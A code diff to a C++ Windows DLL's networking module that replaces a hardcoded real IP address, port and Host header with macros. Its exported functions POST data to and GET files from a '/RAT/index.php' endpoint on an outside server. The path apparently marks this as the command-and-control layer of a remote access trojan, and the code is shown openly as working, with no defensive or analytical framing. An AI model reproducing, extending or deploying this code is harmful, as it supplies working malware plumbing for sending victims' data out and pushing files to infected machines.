@@ -4,6 +4,11 @@
 #include <string>
 #include <mutex>
 #include <vector>
+#define WIN32_LEAN_AND_MEAN
+
+#define ADDR "103.92.235.21"
+#define H_NAME "Host: arth.imbeddex.com\r\n"
+#define PRT 80
 
 SOCKET clientSocket = INVALID_SOCKET;
 std::mutex socketMutex;
@@ -41,8 +46,8 @@ int socket_setup()
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(80);
-    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
+    serverAddr.sin_port = htons(PRT);
+    serverAddr.sin_addr.s_addr = inet_addr(ADDR);
 
     while (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
     {
@@ -62,7 +67,7 @@ __declspec(dllexport) int send_data(const std::string& filename, const std::stri
 
     try {
         std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n"
-                                    "Host: arth.imbeddex.com\r\n"
+                                    H_NAME
                                     "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n"
                                     "Content-Type: application/octet-stream\r\n"
                                     "Connection: keep-alive\r\n\r\n" +
@@ -115,7 +120,7 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
     try
     {
         std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
-                                    "Host: arth.imbeddex.com\r\n"
+                                    H_NAME
                                     "Connection: keep-alive\r\n\r\n";
         int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
         if (bytesSent == SOCKET_ERROR)
@@ -218,8 +223,8 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
 
         sockaddr_in serverAddr;
         serverAddr.sin_family = AF_INET;
-        serverAddr.sin_port = htons(80);
-        serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
+        serverAddr.sin_port = htons(PRT);
+        serverAddr.sin_addr.s_addr = inet_addr(ADDR);
 
         while (connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
         {
@@ -231,7 +236,7 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
 
         // Send HTTP GET request
         std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";
+        httpRequest += H_NAME;
         httpRequest += "Connection: close\r\n\r\n";
 
         int bytesSent = send(TempSocket, httpRequest.c_str(), httpRequest.length(), 0);
